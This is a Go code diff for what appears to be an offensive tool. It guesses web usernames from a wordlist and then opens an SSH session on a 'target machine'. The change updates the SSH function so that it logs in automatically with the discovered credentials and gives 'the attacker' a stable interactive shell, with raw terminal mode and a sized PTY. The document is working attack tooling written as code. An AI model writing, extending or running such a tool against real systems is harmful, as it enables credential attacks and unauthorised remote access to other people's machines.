@@ -6,7 +6,6 @@ import (
 	"encoding/json"
 	"flag"
 	"fmt"
-	"io"
 	"io/ioutil"
 	"net/http"
 	"net/http/cookiejar"
@@ -17,6 +16,7 @@ import (
 	"time"
 
 	"golang.org/x/crypto/ssh"
+	"golang.org/x/crypto/ssh/terminal"
 )
 
 var ANSI_CLRLN string = "\r\x1b[2K\r"
@@ -378,10 +378,9 @@ func FindUsername(baseURL string, wordlist string, threadcount int) (success boo
 //
 //	This function is designed to initialize an SSH
 //	connection with the target machine using a discovered
-//	username and credentials. Right now, the attacker must
-//	manually enter the credentials. Once the credentials are
-//	entered, a stable SSH connection will be opened with the
-//	target machine.
+//	username and credentials. The function automatically logs
+//  in with the credentials discovered and spawns a stable
+//  shell the attacker can use to interact with the target.
 //
 // Input(s):
 //
@@ -422,32 +421,33 @@ func SSHConnection(targetIP string, sshpassword string) (success bool, message s
 	defer session.Close()
 
 	modes := ssh.TerminalModes{
-		ssh.ECHO:          0,
+		ssh.ECHO:          1,
 		ssh.TTY_OP_ISPEED: 14400,
 		ssh.TTY_OP_OSPEED: 14400,
 	}
 
-	if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
-		return false, fmt.Sprintf("request for pseudo terminal failed: %s", err.Error())
-	}
+	session.Stdin = os.Stdin
+	session.Stderr = os.Stderr
+	session.Stdout = os.Stdout
 
-	stdin, err := session.StdinPipe()
-	if err != nil {
-		return false, fmt.Sprintf("Unable to setup stdin for session: %s", err.Error())
-	}
-	go io.Copy(stdin, os.Stdin)
+	// Create stable shell
+	filedescriptor := int(os.Stdin.Fd())
+	if terminal.IsTerminal(filedescriptor) {
+		originalstate, err := terminal.MakeRaw(filedescriptor)
+		if err != nil {
+			ErrMsg(err.Error())
+		}
+		defer terminal.Restore(filedescriptor, originalstate)
 
-	stdout, err := session.StdoutPipe()
-	if err != nil {
-		return false, fmt.Sprintf("Unable to setup stdout for session: %s", err.Error())
-	}
-	go io.Copy(os.Stdout, stdout)
+		tw, th, err := terminal.GetSize(filedescriptor)
+		if err != nil {
+			ErrMsg(err.Error())
+		}
 
-	stderr, err := session.StderrPipe()
-	if err != nil {
-		return false, fmt.Sprintf("Unable to setup stderr for session: %s", err.Error())
+		if err := session.RequestPty("xterm-256color", tw, th, modes); err != nil {
+			return false, fmt.Sprintf("request for pseudo terminal failed: %s", err.Error())
+		}
 	}
-	go io.Copy(os.Stderr, stderr)
 
 	err = session.Shell()
 	if err != nil {
@@ -561,7 +561,7 @@ func main() {
 	InfMsg(fmt.Sprintf("Target Port: %d", targetPort))
 	InfMsg(fmt.Sprintf("Thread Count: %d", threadCount))
 	InfMsg(fmt.Sprintf("Username Wordlist: %s", wordlistu))
-	InfMsg(fmt.Sprintf("Password Wordlist: %s", wordlistp))
+	InfMsgNB(fmt.Sprintf("Password Wordlist: %s", wordlistp))
 	PrintChar('=', 60)
 	fmt.Printf("\n")
 
@@ -611,3 +611,4 @@ func main() {
 	}
 	return
 }
+
